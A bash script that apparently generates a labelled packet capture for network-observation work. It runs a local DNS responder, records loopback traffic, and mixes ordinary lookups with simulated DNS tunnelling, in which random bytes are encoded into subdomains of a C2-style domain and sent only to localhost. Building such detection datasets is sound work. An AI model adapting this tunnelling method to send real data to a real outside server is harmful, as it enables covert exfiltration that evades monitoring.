#!/usr/bin/env bash
set -e
OUT=~/netobs/data/raw/dnstunnel
mkdir -p "$OUT" && cd "$OUT"

# Local DNS responder: answers everything, so queries complete normally.
python3 - << 'PY' &
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.3", 5353))
while True:
    data, addr = s.recvfrom(4096)
    if len(data) < 12:
        continue
    tid = data[:2]
    q = data[12:]
    resp = tid + b"\x81\x80" + data[4:6] + b"\x00\x01" + b"\x00\x00\x00\x00"
    resp += q
    resp += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + bytes([10,1,1,1])
    s.sendto(resp, addr)
PY
DNS=$!
sleep 1

echo "capturing..."
sudo timeout 40 tcpdump -i lo -w dnstunnel.pcap 2>/dev/null &
TCPD=$!
sleep 2

echo "normal dns..."
for d in google.com wikipedia.org github.com cloudflare.com debian.org; do
  for i in 1 2 3; do
    dig +short +timeout=1 +tries=1 @127.0.0.3 -p 5353 "$d" > /dev/null 2>&1 || true
    sleep 0.2
  done
done

echo "tunnelling..."
python3 - << 'PY'
import base64, os, subprocess, time
payload = os.urandom(4000)
chunks = [payload[i:i+24] for i in range(0, len(payload), 24)]
for i, c in enumerate(chunks):
    lab = base64.b32encode(c).decode().rstrip("=").lower()
    name = f"{lab[:32]}.{i:04x}.tunnel-c2.net"
    subprocess.run(["dig", "+short", "+timeout=1", "+tries=1",
                    "@127.0.0.3", "-p", "5353", name, "TXT"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.08)
print(f"sent {len(chunks)} tunnel queries")
PY

echo "waiting for capture..."
wait $TCPD 2>/dev/null || true
kill $DNS 2>/dev/null || true
ls -lh dnstunnel.pcap
